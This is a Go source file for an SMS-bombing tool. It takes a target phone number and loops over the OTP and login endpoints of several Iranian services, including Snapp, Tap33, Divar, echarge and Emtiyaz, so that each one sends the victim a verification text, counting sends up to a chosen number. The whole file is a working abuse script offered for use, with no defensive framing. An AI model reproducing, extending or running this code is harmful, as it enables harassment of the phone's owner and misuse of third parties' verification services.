package main

import (
	"bufio"
	"bytes"
	"encoding/json"
	"flag"
	"fmt"
	"log"
	"net/http"
	"os"
	"reflect"
)

var agents = map[string]func(string) error{
	"snapp": func(pn string) error {
		return AgentHelper("https://app.snapp.taxi/api/api-passenger-oauth/v2/otp",
			map[string]any{"cellphone": "+98" + pn}, map[string]any{"status": "OK"})
	},
	"tap33": func(pn string) error {
		return AgentHelper("https://tap33.me/api/v2/user",
			map[string]any{"credential": map[string]any{"phoneNumber": "0" + pn, "role": "PASSENGER"}},
			map[string]any{"result": "OK"})
	},
	"echarge": func(pn string) error {
		return AgentHelper("https://www.echarge.ir/m/login?length=19",
			map[string]any{"phoneNumber": "0" + pn},
			map[string]any{"authenticate_response": "AUTHENTICATION_VERIFICATION_CODE_SENT"})
	},
	"divar": func(pn string) error {
		return AgentHelper("https://api.divar.ir/v5/auth/authenticate",
			map[string]any{"phone": "0" + pn}, map[string]any{"status": "OK"})
	},
	"shadmessenger12": func(pn string) error {
		return AgentHelper("https://shadmessenger12.iranlms.ir/",
			map[string]any{"phone": "0" + pn}, map[string]any{"status": "OK"})
	},
	"messengerg2c4": func(pn string) error {
		return AgentHelper("https://messengerg2c4.iranlms.ir/",
			map[string]any{"phone": "+" + pn}, map[string]any{"status": "OK"})
	},
	"emtiyaz": func(pn string) error {
		return AgentHelper("https://web.emtiyaz.app/json/login",
			map[string]any{"phone": "+98" + pn}, map[string]any{"status": "OK"})
	},
}

func AgentHelper(URI string, bodyMap map[string]any, successResponse map[string]any) error {
	body, err := json.Marshal(bodyMap)
	if err != nil {
		return fmt.Errorf("json.Marshal: %v", err)
	}

	resp, err := http.Post(URI, "application/json", bytes.NewBuffer(body))
	if err != nil {
		return fmt.Errorf("http.Post: %v", err)
	}

	var resBody map[string]any
	json.NewDecoder(resp.Body).Decode(&resBody)
	if resp.StatusCode == http.StatusOK && reflect.DeepEqual(resBody, successResponse) {
		return nil
	}

	if resBody == nil {
		return fmt.Errorf("Failed: response is not JSON (code: %d)", resp.StatusCode)
	}
	return fmt.Errorf("Failed: %v", resBody)
}

func main() {
	phoneP := flag.String("phone", "", "Phone number without code or zero e.g 915xxxxxxx")
	countP := flag.Uint("count", 5, "Count of sent SMS to target number")
	flag.Parse()

	if *phoneP == "" {
		flag.PrintDefaults()
		os.Exit(1)
	}

	var count uint
	for {
		for name, agent := range agents {
			if count >= *countP {
				return
			}

			if err := agent(*phoneP); err != nil {
				log.Println(name, err)
			} else {
				count++
				fmt.Printf("\r%d", count)
				bufio.NewWriter(os.Stdout).Flush()
			}
		}
	}
}
